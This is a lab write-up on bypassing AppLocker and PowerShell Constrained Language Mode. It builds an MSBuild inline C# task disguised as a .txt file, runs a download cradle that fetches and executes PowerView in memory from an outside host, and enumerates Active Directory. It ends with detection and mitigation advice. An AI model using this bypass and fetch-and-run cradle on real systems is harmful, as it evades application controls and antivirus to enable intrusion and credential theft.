Bypassing AppLocker and Constrained Language Mode

A workstation in the ecorp domain with AppLocker and Constrained Language Mode enabled. The plan: regain a PowerShell in Full Language and run PowerView in memory to enumerate Active Directory, without touching the disk where antivirus and AppLocker stand guard.

// scope
My own isolated lab, reproducing the scenario from the book How to Hack Like a Legend: Breaking Windows (Sparc Flow). Domain and data are fictional. Strictly educational; applying these techniques without authorization is illegal.

Objective

The target has two containment layers: AppLocker, which restricts where binaries and scripts may run, and PowerShell's Constrained Language Mode (CLM), which sharply limits what the language can do. I want to load PowerView to enumerate AD, but it has to run in memory. On disk, both Windows Defender and AppLocker would block it.

1. The obstacle: Constrained Language Mode

The first attempt is the classic download cradle pattern: instantiate an HTTP client to download and run the script straight in memory. It fails immediately, because PowerShell refuses to create the object and the language mode only accepts core types: 

$browser = New-Object System.Net.WebClient

Confirming the reason, the session's language mode is ConstrainedLanguage:

$ExecutionContext.SessionState.LanguageMode
# ConstrainedLanguage

Under CLM, PowerShell blocks New-Object for arbitrary .NET types, direct .NET method calls, Add-Type, COM and more. It is the containment Microsoft couples to AppLocker/WDAC: even with a shell open, the attacker is left without the primitives most offensive tooling assumes.

2. The AppLocker rules

Before the bypass, you need to know where the policy actually allows execution. The effective rules are read straight from the module: 

Import-Module AppLocker
$a = Get-AppLockerPolicy -Effective
$a.RuleCollections

The host runs the default rules: the Everyone group can run anything under %PROGRAMFILES% and %WINDIR%. It looks safe, since a regular user cannot write to those directories. The catch is that %WINDIR% holds Microsoft-signed binaries that execute code on our behalf (the LOLBINs). One of them becomes the way in.

3. The idea: a custom PowerShell wrapper

The key point: Constrained Language Mode is a property of the PowerShell host, not the engine. Much of the functionality comes from the System.Management.Automation.dll library, and that DLL keeps operating in Full Language even when the interactive session is in CLM.

The consequence is direct: if we build our own host, a wrapper that loads System.Management.Automation.dll and creates a fresh runspace, that runspace is born in Full Language and hands back full PowerShell. And if it is launched by a binary AppLocker already trusts, both barriers fall together.

4. Building the wrapper with MSBuild

The vehicle is MSBuild.exe: Microsoft-signed, living under %WINDIR% (so allowed by AppLocker) and able to compile and run inline tasks in C#. The wrapper lives in an innocent-looking file (here, a .txt). The workstation uses MSBuild 4.0, so we start by pinning that version: 

<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
</Project>

We define a custom task and add it to the project's target:

<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="PSBYPASS">
    <PsCommand/>
  </Target>
</Project>

The task is named PsCommand, and MSBuild will compile and run it. To compile C# inline, we load CodeTaskFactory from Microsoft.Build.Tasks.v4.0.dll and reference System.Management.Automation: 

<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="PSBYPASS">
    <PsCommand/>
  </Target>

  <UsingTask
      TaskName="PsCommand"
      TaskFactory="CodeTaskFactory"
      AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Reference Include="System.Management.Automation"/>
      <Code Type="Class" Language="cs">
        <![CDATA[
        // C# code here
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>

The C# code

Inside the CDATA goes the task. It creates a PowerShell object from System.Management.Automation and, as a proof of concept, asks the language mode of the freshly created runspace: 

using System;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;
using System.Management.Automation;
using System.Management.Automation.Host;
using System.Management.Automation.Runspaces;
using PowerShell = System.Management.Automation.PowerShell;

public class PsCommand : Task, ITask
{
    public override bool Execute()
    {
        Console.WriteLine("Executing PS commands");

        PowerShell Ps_instance = PowerShell.Create();
        Ps_instance.AddScript("$ExecutionContext.SessionState.LanguageMode");

        foreach (string str in Ps_instance.Invoke<string>())
            Console.WriteLine(str);

        Console.WriteLine("Press any key to exit...");
        Console.ReadKey();
        return true;
    }
}

5. Running it: Full Language back

Running the wrapper with the AppLocker-allowed MSBuild. The file is just a .txt, because AppLocker evaluates the binary that launches, not the text content: 

.\MSBuild.exe C:\Users\...\Downloads\dunga.txt

The runspace created by the DLL was born in Full Language. Both barriers fell in the same move: AppLocker approved MSBuild.exe and CLM does not reach the new host.

6. Interactive console

A PoC that only prints the language mode is little. Building on the excellent work of Sparc Flow in How to Hack Like a Legend, the same principle becomes a full interactive console. The logic is identical: XML disguised as a .txt, compiled by MSBuild.exe (accepted by AppLocker), delivering a PowerShell in Full Language. 

.\MSBuild.exe C:\Users\...\Downloads\console.txt

Interactive console source: sparcflow/HackLikeALegend, msbuild/console.xml.

7. Loading PowerView in memory

With Full Language back, New-Object works. Windows Defender is still enabled, so PowerView is loaded straight into memory, avoiding file-based detection: 

$browser = New-Object System.Net.WebClient
$browser.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
IEX($browser.DownloadString('http://192.168.0.16:8000/miniview.ps1'))

8. Enumerating Active Directory

With PowerView loaded, a simple enumeration of domain users:

Get-NetUser | Select name, description

Beyond the users, the description field handed over a classic real-AD gift: a password stored in cleartext in the object's description, the kind of low-hanging fruit that LDAP enumeration tends to reveal.

Conclusion

Two serious defenses, AppLocker and Constrained Language Mode, were bypassed not by a software flaw but by the combination of two design facts: CLM lives in the host, and a trusted LOLBIN (MSBuild.exe) hosts a new runspace in Full Language. The lesson stands: defense in depth falls when one of the layers trusts an entire tree of binaries. From there, the path to enumerating AD and finding credentials is short.

Detection and mitigation

  • WDAC alongside (or beyond) AppLocker: a code-based policy with DLL rules closes many of the LOLBINs AppLocker alone ignores.
  • Block or audit MSBuild.exe and similar (InstallUtil, csc) on workstations that do not compile code.
  • Script Block Logging (event 4104) and AMSI: runspace creation and the PowerView load are recorded even in memory.
  • Review the AppLocker default rules: swap whole-tree trust for publisher/hash rules and remove user-writable subfolders.
  • AD hygiene: never store a password in the description field; audit the attribute periodically.
